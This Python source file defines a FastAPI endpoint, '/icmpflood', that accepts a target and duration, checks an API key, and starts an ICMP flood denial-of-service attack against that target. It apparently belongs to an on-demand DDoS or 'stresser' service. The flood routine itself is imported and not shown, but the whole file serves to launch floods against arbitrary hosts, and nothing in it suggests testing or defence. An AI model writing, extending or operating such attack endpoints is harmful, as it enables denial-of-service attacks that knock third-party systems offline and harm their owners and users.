import json
from fastapi import APIRouter, Depends, Request
from fastapi.responses import Response
from src.denialofservice.layer3 import Layer3
from src.attack import Attack
from src.log import log
from src.schemas import ICMPFloodRequest
from src.auth import verify_api_key

layer3_router = APIRouter()


@layer3_router.post("/icmpflood")
async def icmp_flood(icmp_flood: ICMPFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 3", "ICMP-Flood", Layer3.icmp_flood,
                        api_key, json.loads(icmp_flood.json()))
        attack.start()
        log.info(
            f"{icmp_flood.target} ICMP-Flooded from {request.client.host} for {icmp_flood.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{icmp_flood.target} ICMP-Flood from {request.client.host} for {icmp_flood.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "ICMP-Flood failed"}), media_type="application/json")
